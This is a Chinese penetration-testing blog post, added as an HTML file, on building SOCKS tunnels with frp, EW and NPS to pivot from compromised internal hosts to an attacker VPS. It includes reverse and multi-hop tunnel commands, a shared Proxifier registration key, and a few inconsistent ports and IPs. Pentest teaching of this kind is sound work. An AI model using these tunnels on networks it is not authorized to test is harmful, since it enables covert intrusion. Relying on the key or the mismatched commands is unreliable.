@@ -1,0 +1,1026 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head>
+    <title>
+        内网穿透工具的使用 - AD钙奶的博客
+      </title>
+        <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    
+    <meta name="theme-color" content="#000000" />
+    
+    <meta http-equiv="window-target" content="_top" />
+    
+    
+    <meta name="description" content="内网穿透" />
+    <meta name="generator" content="Hugo 0.87.0 with theme pure" />
+    <title>内网穿透工具的使用 - AD钙奶的博客</title>
+    
+    
+    <link rel="stylesheet" href="https://ad-calcium.github.io/css/style.min.e64d754037c0ee0ec4e20ab1d6f07740ace61729bc03850559b8caa21ae4a597.css">
+    
+    <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/9.15.10/styles/github.min.css" async>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
+    <meta property="og:title" content="内网穿透工具的使用" />
+<meta property="og:description" content="内网穿透" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ad-calcium.github.io/2021/09/%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/" /><meta property="article:section" content="posts" />
+
+<meta property="article:modified_time" content="2021-09-04T00:00:00+00:00" />
+<meta property="og:see_also" content="https://ad-calcium.github.io/2021/09/impacket%E5%A5%97%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/" /><meta property="og:see_also" content="https://ad-calcium.github.io/2021/09/cve-2021-26084confluence-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" /><meta property="og:see_also" content="https://ad-calcium.github.io/2021/09/mimikatz%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/" /><meta property="og:see_also" content="https://ad-calcium.github.io/2021/08/mssql%E6%8F%90%E6%9D%83%E4%B9%8B%E4%BD%BF%E7%94%A8clr-bypass360/" /><meta property="og:see_also" content="https://ad-calcium.github.io/2021/08/exchange2019%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/" />
+
+<meta itemprop="name" content="内网穿透工具的使用">
+<meta itemprop="description" content="内网穿透">
+<meta itemprop="dateModified" content="2021-09-04T00:00:00+00:00" />
+<meta itemprop="wordCount" content="4336">
+<meta itemprop="keywords" content="流量代理,内网渗透," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="内网穿透工具的使用"/>
+<meta name="twitter:description" content="内网穿透"/>
+
+    <!--[if lte IE 9]>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+      <![endif]-->
+
+    <!--[if lt IE 9]>
+        <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+      <![endif]-->
+  </head>
+
+  
+  
+
+  <body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <div class="slimContent">
+      <div class="navbar-header">
+        <div class="profile-block text-center">
+          <a id="avatar" href="https://github.com/ad-calcium" target="_blank">
+            <img class="img-circle img-rotate" src="https://ad-calcium.github.io/avatar.png" width="200" height="200">
+          </a>
+          <h2 id="name" class="hidden-xs hidden-sm">AD钙奶</h2>
+          <h3 id="title" class="hidden-xs hidden-sm hidden-md"></h3>
+          <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i>China</small>
+        </div><div class="search" id="search-form-wrap">
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i
+                        class="icon icon-search"></i></button>
+            </span>
+        </div>
+        <div class="ins-search">
+            <div class="ins-search-mask"></div>
+            <div class="ins-search-container">
+                <div class="ins-input-wrapper">
+                    <input type="text" class="ins-search-input" placeholder="想要查找什么..."
+                        x-webkit-speech />
+                    <button type="button" class="close ins-close ins-selectable" data-dismiss="modal"
+                        aria-label="Close"><span aria-hidden="true">×</span></button>
+                </div>
+                <div class="ins-section-wrapper">
+                    <div class="ins-section-container"></div>
+                </div>
+            </div>
+        </div>
+    </form>
+</div>
+        <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+      </div>
+      <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+        <ul class="nav navbar-nav main-nav">
+            <li class="menu-item menu-item-home">
+                <a href="/">
+                    <i class="icon icon-home-fill"></i>
+                  <span class="menu-title">Home</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-archives">
+                <a href="/posts/">
+                    <i class="icon icon-archives-fill"></i>
+                  <span class="menu-title">Archives</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-categories">
+                <a href="/categories/">
+                    <i class="icon icon-folder"></i>
+                  <span class="menu-title">Categories</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-tags">
+                <a href="/tags/">
+                    <i class="icon icon-tags"></i>
+                  <span class="menu-title">Tags</span>
+                </a>
+            </li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+<aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content"><p>不忘初心方能始终</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+      <div class="widget">
+    <h3 class="widget-title"> 标签</h3>
+    <div id="tag-cloud-list" class="widget-body">
+            
+            
+            <a href="https://ad-calcium.github.io/tags/confluence/" class="tag-list-link" rel="1">confluence<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/exchange/" class="tag-list-link" rel="2">exchange<span
+               class="tag-list-count">2</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/mssql/" class="tag-list-link" rel="2">mssql<span
+               class="tag-list-count">2</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/mssql%E6%8F%90%E6%9D%83/" class="tag-list-link" rel="2">mssql提权<span
+               class="tag-list-count">2</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/web%E5%AE%89%E5%85%A8/" class="tag-list-link" rel="5">web安全<span
+               class="tag-list-count">5</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/web%E6%B8%97%E9%80%8F/" class="tag-list-link" rel="1">web渗透<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91/" class="tag-list-link" rel="3">内网<span
+               class="tag-list-count">3</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="tag-list-link" rel="3">内网渗透<span
+               class="tag-list-count">3</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E5%87%AD%E6%8D%AE%E7%AA%83%E5%8F%96/" class="tag-list-link" rel="1">凭据窃取<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E5%AE%89%E8%A3%85%E5%8D%9A%E5%AE%A2/" class="tag-list-link" rel="1">安装博客<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E5%B0%8F%E6%8A%80%E5%B7%A7/" class="tag-list-link" rel="1">小技巧<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83/" class="tag-list-link" rel="1">未授权<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="tag-list-link" rel="1">横向移动<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/" class="tag-list-link" rel="1">流量代理<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="tag-list-link" rel="12">漏洞复现<span
+               class="tag-list-count">12</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/" class="tag-list-link" rel="1">软件安装<span
+               class="tag-list-count">1</span></a>
+            
+    </div>
+<script>
+document.onreadystatechange = () => {
+  if (document.readyState === 'complete') {
+    tagCloud('#tag-cloud-list a',  15 ,  30 );
+  }
+};
+
+function tagCloud(where, min, max) {
+  let iMax = 0;
+  let iMin = 0;
+  $(where).each(function() {
+    let weight = Number($(this).attr("rel"));
+    if(iMax < weight) iMax = weight;
+    if(iMin > weight || iMin == 0) iMin = weight;
+  });
+  let step = (max - min)/(iMax - iMin);
+  $(where).each(function() {
+    let weight = $(this).attr("rel") - iMin;
+    $(this).css({"font-size": min + (weight * step) + 'px'});
+  });
+};
+</script>
+</div>
+
+      <div class="widget">
+    <h3 class="widget-title"> 分类</h3>
+    <div class="widget-body">
+        <ul class="category-list">
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/sql%E6%B3%A8%E5%85%A5/" class="category-list-link">sql注入</a><span class="category-list-count">1</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/web%E5%AE%89%E5%85%A8/" class="category-list-link">web安全</a><span class="category-list-count">1</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="category-list-link">内网渗透</a><span class="category-list-count">3</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E5%87%AD%E6%8D%AE%E7%AA%83%E5%8F%96/" class="category-list-link">凭据窃取</a><span class="category-list-count">1</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E5%B0%8F%E6%8A%80%E5%B7%A7/" class="category-list-link">小技巧</a><span class="category-list-count">3</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" class="category-list-link">数据库</a><span class="category-list-count">2</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/" class="category-list-link">未授权漏洞</a><span class="category-list-count">1</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="category-list-link">横向移动</a><span class="category-list-count">1</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="category-list-link">漏洞复现</a><span class="category-list-count">10</span></li>
+        </ul>
+    </div>
+</div>
+      <div class="widget">
+    <h3 class="widget-title"> 标签</h3>
+    <div class="widget-body">
+        <ul class="tag-list">
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/confluence/" class="tag-list-link">confluence</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/exchange/" class="tag-list-link">exchange</a><span
+                    class="tag-list-count">2</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/mssql/" class="tag-list-link">mssql</a><span
+                    class="tag-list-count">2</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/mssql%E6%8F%90%E6%9D%83/" class="tag-list-link">mssql提权</a><span
+                    class="tag-list-count">2</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/web%E5%AE%89%E5%85%A8/" class="tag-list-link">web安全</a><span
+                    class="tag-list-count">5</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/web%E6%B8%97%E9%80%8F/" class="tag-list-link">web渗透</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91/" class="tag-list-link">内网</a><span
+                    class="tag-list-count">3</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="tag-list-link">内网渗透</a><span
+                    class="tag-list-count">3</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E5%87%AD%E6%8D%AE%E7%AA%83%E5%8F%96/" class="tag-list-link">凭据窃取</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E5%AE%89%E8%A3%85%E5%8D%9A%E5%AE%A2/" class="tag-list-link">安装博客</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E5%B0%8F%E6%8A%80%E5%B7%A7/" class="tag-list-link">小技巧</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83/" class="tag-list-link">未授权</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="tag-list-link">横向移动</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/" class="tag-list-link">流量代理</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="tag-list-link">漏洞复现</a><span
+                    class="tag-list-count">12</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/" class="tag-list-link">软件安装</a><span
+                    class="tag-list-count">1</span></li>
+            
+        </ul>
+
+    </div>
+</div>
+      
+<div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+        <ul class="recent-post-list list-unstyled no-thumbnail">
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://ad-calcium.github.io/2021/09/impacket%E5%A5%97%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/" class="title">IMPACKET套件使用</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2021-09-04 00:00:00 &#43;0000 UTC" itemprop="datePublished">2021-09-04</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://ad-calcium.github.io/2021/09/%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/" class="title">内网穿透工具的使用</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2021-09-04 00:00:00 &#43;0000 UTC" itemprop="datePublished">2021-09-04</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://ad-calcium.github.io/2021/09/cve-2021-26084confluence-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="title">CVE-2021-26084(Confluence) 漏洞复现</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2021-09-02 00:00:00 &#43;0000 UTC" itemprop="datePublished">2021-09-02</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://ad-calcium.github.io/2021/09/mimikatz%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/" class="title">内网穿透工具的使用</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2021-09-02 00:00:00 &#43;0000 UTC" itemprop="datePublished">2021-09-02</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://ad-calcium.github.io/2021/08/mssql%E6%8F%90%E6%9D%83%E4%B9%8B%E4%BD%BF%E7%94%A8clr-bypass360/" class="title">mssql提权之使用clr bypass360</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2021-08-21 00:00:00 &#43;0000 UTC" itemprop="datePublished">2021-08-21</time>
+                    </p>
+                </div>
+            </li>
+        </ul>
+    </div>
+</div>
+  </div>
+</aside>
+
+    
+    
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <h4 class="toc-title">文章目录</h4>
+    <nav id="toc" class="js-toc toc">
+
+    </nav>
+  </div>
+</aside>
+<main class="main" role="main"><div class="content">
+  <article id="-" class="article article-type-" itemscope
+    itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      <h1 itemprop="name">
+  <a
+    class="article-title"
+    href="/2021/09/%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/"
+    >内网穿透工具的使用</a
+  >
+</h1>
+
+      <div class="article-meta">
+        
+<span class="article-date">
+  <i class="icon icon-calendar-check"></i>&nbsp;
+<a href="https://ad-calcium.github.io/2021/09/%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/" class="article-date">
+  <time datetime="2021-09-04 00:00:00 &#43;0000 UTC" itemprop="datePublished">2021-09-04</time>
+</a>
+</span>
+<span class="article-category">
+  <i class="icon icon-folder"></i>&nbsp;
+  <a class="article-category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"> 内网渗透 </a>
+</span>  
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>&nbsp;
+    <a class="article-tag-link" href="/tags/%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/"> 流量代理 </a>
+    <a class="article-tag-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"> 内网渗透 </a>
+  </span>
+
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 4336字</span>
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 9分 </span>
+      </div>
+    </div>
+    <div class="article-entry marked-body js-toc-content" itemprop="articleBody">
+      <h1 id="0x00-内网穿透技术">0x00 内网穿透技术</h1>
+<p>当我们拿到一台内网主机后，一般都是有区域隔离的。所以这时候就用到流量代理了。这里简单介绍一下建立通信隧道，常见的有端口转发等</p>
+<p>主要隧道有：</p>
+<pre><code>ICMP TCP UDP SSH HTTP DNS  SOCKS
+</code></pre>
+<h1 id="0x01-首先判断出网协议">0x01 首先判断出网协议</h1>
+<h2 id="icmp协议">icmp协议：</h2>
+<pre><code>ping www.baidu.com
+</code></pre>
+<h2 id="tcp协议">TCP协议：</h2>
+<pre><code>curl www.baidu.com
+nc IP
+</code></pre>
+<h2 id="http协议">HTTP协议：</h2>
+<pre><code>curl ip:port
+curl www.baidu.com:80
+</code></pre>
+<h2 id="dns协议">DNS协议：</h2>
+<pre><code>Nslookup www.baidu.com
+Dig www.baidu.com
+</code></pre>
+<h1 id="0x02理论知识">0x02理论知识</h1>
+<h2 id="正向代理">正向代理</h2>
+<pre><code>正向代理类似一个跳板机，代理访问外部资源（比如我们国内访问谷歌，直接访问访问不到，我们可以通过一个正向代理服务器，请求发到代理服，代理服务器能够访问谷歌，这样由代理去谷歌取到返回数据，再返回给我们，这样我们就能访问谷歌了）
+</code></pre>
+<h2 id="反向代理">反向代理</h2>
+<pre><code>反向代理（Reverse Proxy）实际运行方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器
+</code></pre>
+<h1 id="0x03常用工具">0x03常用工具</h1>
+<pre><code>https://www.proxifier.com/
+https://github.com/fatedier/frp
+https://github.com/ehang-io/nps
+https://github.com/L-codes/Neo-reGeorg
+
+
+proxifier注册码
+用户名：zxhi
+注册码：LYZGL-F2KX3-JW5W4-A33MC-25QHH
+</code></pre>
+<h1 id="0x04-各种协议隧道">0x04 各种协议隧道</h1>
+<h2 id="一socks代理">一、Socks代理</h2>
+<h3 id="1-frp隧道">1. FRP隧道</h3>
+<h4 id="11-正向代理">1.1 正向代理</h4>
+<h5 id="1在客户端配置">1、在客户端配置</h5>
+<pre><code>[common]
+bind_addr = 0.0.0.0
+bind_port = 7000
+token = 123456
+</code></pre>
+<p>配置好之后运行<code>frps.exe -c frps.ini</code></p>
+<h5 id="2在vps中配置">2、在vps中配置</h5>
+<p>frpc.ini</p>
+<pre><code>[common]
+# 填写客户端的
+server_addr = 10.108.3.58
+server_port = 7000
+token = 123456
+
+[plugin_http_proxy]
+type = tcp
+remote_port = 7890
+plugin = http_proxy
+# 可以添加认证
+# plugin_http_user = abc
+# plugin_http_passwd = abc
+
+[plugin_socks5]
+type = tcp
+remote_port = 7891
+plugin = socks5
+# plugin_user = abc
+# plugin_passwd = abc
+</code></pre>
+<p>配置好之后运行<code>frpc.exe -c frpc.ini</code></p>
+<h4 id="12-反向代理">1.2. 反向代理</h4>
+<p>目的：</p>
+<pre><code>1.需要通过公网服务器代理连接内网机器
+2.需要通过代理使得本机外网地址变为该内网机器外网IP
+</code></pre>
+<p>拓扑图</p>
+<p><img src="./images/20210721004100751_19779.png" alt=""></p>
+<h5 id="1首先在公网上配置服务端frpsini">1、首先在公网上配置服务端(frps.ini)</h5>
+<p>#frps.ini</p>
+<pre><code>[common]
+bind_addr = 0.0.0.0
+bind_port = 7000
+token = 123456
+</code></pre>
+<p><img src="./images/20210721001549988_3587.png" alt=""></p>
+<p>配置好之后运行<code>frps.exe -c frps.ini</code></p>
+<p><img src="./images/20210721001950216_9760.png" alt=""></p>
+<h5 id="2配置客户端frpc-ini">2、配置客户端frpc. ini</h5>
+<p>#frpc.ini</p>
+<pre><code>[common]
+# 填写攻击机的地址
+server_addr = 10.108.3.58
+server_port = 7000
+token = 123456
+
+[plugin_http_proxy]
+type = tcp
+remote_port = 7890
+plugin = http_proxy
+# 可以添加认证
+# plugin_http_user = abc
+# plugin_http_passwd = abc
+
+[plugin_socks5]
+type = tcp
+remote_port = 7891
+plugin = socks5
+# plugin_user = abc
+# plugin_passwd = abc
+</code></pre>
+<p><img src="./images/20210721001747762_4611.png" alt="">
+配置好之后运行<code>frpc.exe -c frpc.ini</code></p>
+<p><img src="./images/20210721002006114_19060.png" alt=""></p>
+<h5 id="3配置proxifier">3、配置proxifier</h5>
+<p><img src="./images/20210721002033198_9344.png" alt=""></p>
+<p>配置ip、端口、连接方式、账号密码</p>
+<p><img src="./images/20210721002404375_7966.png" alt=""></p>
+<p><img src="./images/20210721002420441_6423.png" alt=""></p>
+<p>配置通过该代理的IP
+Target hosts处添加允许通过的IP（一般内网我都会只让内网的IP通过，防止流量过大）</p>
+<p><img src="./images/20210721002927826_12638.png" alt=""></p>
+<p><img src="./images/20210721002944989_28306.png" alt=""></p>
+<p>尝试访问内网地址</p>
+<p><img src="./images/20210721003019909_30798.png" alt=""></p>
+<h4 id="13多层socks代理">1.3.多层socks代理</h4>
+<p>实验环境：内网C主机不能直接连接vps，可以连接内网B主机，B主机可以直接连接vps，所以通过B作为跳板，将socks代理建设在内网C主机中</p>
+<p><img src="./images/image-20210725004808097.png" alt="image-20210725004808097"></p>
+<p>具体思路：利用B即作为服务端(frps)，也同时作为客户端(frpc)</p>
+<h5 id="1vps配置frpsini">1、VPS配置frps.ini</h5>
+<p>#frps.ini</p>
+<pre><code>[common]
+bind_addr = 0.0.0.0
+bind_port = 7000
+</code></pre>
+<p>配置好之后运行</p>
+<pre><code>frps.exe -c frps.ini
+</code></pre>
+<p><img src="./images/image-20210725005010820.png" alt="image-20210725005010820"></p>
+<h5 id="2内网b主机的frpsini设置">2、内网B主机的frps.ini设置：</h5>
+<pre><code>[common]
+#填写ip当前主机的ip地址
+bind_addr = 192.168.100.40
+bind_port = 7000
+</code></pre>
+<p>配置好之后运行</p>
+<pre><code>frpc.exe -c frpc.ini
+</code></pre>
+<h5 id="3内网c主机的frpcini设置">3、内网C主机的frpc.ini设置</h5>
+<p>frpc.ini</p>
+<pre><code>[common]
+#填写跳板的地址，这里填写的是主机website主机的iP地址
+server_addr = 192.168.100.40
+server_port = 7000
+
+
+[plugin_socks5]
+type = tcp
+remote_port = 7777
+plugin = socks5
+</code></pre>
+<p>配置好之后运行</p>
+<pre><code>frpc.exe -c frpc.ini
+</code></pre>
+<h5 id="4内网b主机的frpcini设置">4、内网B主机的frpc.ini设置：</h5>
+<p>#frpc.ini</p>
+<pre><code>[common]
+# 填写自己的服务器IP
+server_addr = 10.108.3.58
+server_port = 7000
+
+
+[pandan]
+type = tcp
+local_ip= 192.168.100.40
+remote_port = 7777
+local_port = 7777
+</code></pre>
+<p>配置好之后运行</p>
+<pre><code>frpc.exe -c frpc.ini
+</code></pre>
+<p>思路分析：</p>
+<p>两个启动以后，其实已经可以直接通过使用B主机ip+端口直接使用搭建在C主机的socks代理，但是此时是无法直接访问B主机的，但是B主机出网，所以可以通过将刚刚C连接B的7891端口映射到vps上，通过连接vps+端口使用C主机的socks代理</p>
+<h5 id="5测试socks代理是否搭建成功">5、测试socks代理是否搭建成功：</h5>
+<p>访问主机B的web服务(192.168.1.50)</p>
+<p><img src="images/image-20210725011317773.png" alt="image-20210725011317773"></p>
+<p>访问主机C的web服务(192.168.2.200)</p>
+<p><img src="images/image-20210725011338666.png" alt="image-20210725011338666"></p>
+<p>说明代理没问题</p>
+<h3 id="2ew">2.EW</h3>
+<h4 id="21反向代理">2.1、反向代理</h4>
+<p>攻击机：</p>
+<pre><code>ew -s rcsocks -l 1081 -e 1080
+
+将靶机中的1080端口流量代理到本地的1081端口上
+</code></pre>
+<p>靶机</p>
+<pre><code>ew -s rssocks -d 攻击机IP -e 1080
+</code></pre>
+<h4 id="22多层代理">2.2、多层代理</h4>
+<pre><code>获得目标网络内两台主机 A、B 的权限，情况描述如下：
+
+A 主机：  目标网络的边界主机，无公网 IP，无法访问特定资源。
+B 主机：  目标网络内部主机，可访问特定资源，却无法回连公网。
+
+A 主机可直连 B 主机
+                    一台可控公网IP主机                           可控内网主机A                           内网主机C
+ +---------+     +--------------------------+    |       +------------------------+      +-----------------------------+
+|HackTools| -&gt;&gt; | 9999 -&gt;  10.108.3.58 -&gt; 8888   | 防火墙 | &lt;--  192.168.1.50 --&gt;  | -&gt;&gt; | 9999 --&gt; 192.168.2.200        |
+ +---------+     +--------------------------+    |       +------------------------+      +-----------------------------+
+</code></pre>
+<p>在VPS( 10.108.3.58 )公网主机添加转接隧道，将 9999收到的代理请求，转交给反连 8888 端口的主机</p>
+<pre><code>ew -s lcx_listen -l 9999 -e 8888
+</code></pre>
+<p><img src="images/image-20210725015710580.png" alt="image-20210725015710580"></p>
+<p>在内网主机A(192.168.2.200)上利用 ssocksd 方式启动 7777端口的 socks 代理</p>
+<pre><code>ew -s ssocksd -l 777
+</code></pre>
+<p><img src="images/image-20210725015905784.png" alt="image-20210725015905784"></p>
+<p>在 192.168.1.50 上，通过工具的 lcx_slave 方式，打通10.108.3.58:9999 和 192.168.2.200:7777之间的通讯隧道</p>
+<pre><code>ew -s lcx_slave -d 10.108.3.58 -e 8888 -f 192.168.1.200 -g 7777
+</code></pre>
+<p><img src="images/image-20210725015759070.png" alt="image-20210725015759070"></p>
+<p>验证</p>
+<p><img src="images/image-20210725015620571.png" alt="image-20210725015620571"></p>
+<h3 id="3nps">3.NPS</h3>
+<p>NPS工具是一款使用go语言编写的轻量级、功能强大的内网穿透工具。支持TCP、UDP流量转发，支持内网HTTP、SOCKS5代理，同时支持snappy压缩(节省带宽和流量)、站点保护、加密传输、多路复用、header修改等。同时还支持web图形化管理。该工具使用简单，相比于FRP，NPS是图形化界面，因此配置更加简单。</p>
+<h4 id="31-反向代理">3.1 反向代理</h4>
+<h5 id="配置nps">配置nps</h5>
+<p>在nps目录下面会有一个nps可执行文件、conf配置目录和web网页目录，我们只需要修改<code>conf/nps.conf</code>即可：</p>
+<p>需要改一下<code>#web</code>下面的几个参数，</p>
+<pre><code>web_host= 服务器IP或者域名
+web_username= admin（登录用户名）
+web_password= 你的密码
+web_port=8080（web管理端口）
+</code></pre>
+<p><img src="images/image-20210904145052705.png" alt="image-20210904145052705"></p>
+<p>修改<code>#bridge</code> 可以更改 NPC的连接端口。比如我们拿到一台权限受限的服务器，有防火墙，可能只有部分端口（80，443）可以出网，就需要修改成出网端口。</p>
+<pre><code>##bridge
+bridge_type=tcp
+bridge_port=443    # 修改连接端口
+bridge_ip=0.0.0.0
+</code></pre>
+<h5 id="启动server">启动server</h5>
+<p><img src="images/image-20210904145226109.png" alt="image-20210904145226109"></p>
+<p>访问WEB管理页面（默认web界面端口是8080，默认密码为admin/123 ，可以在配置文件里修改默认端口和账号密码）</p>
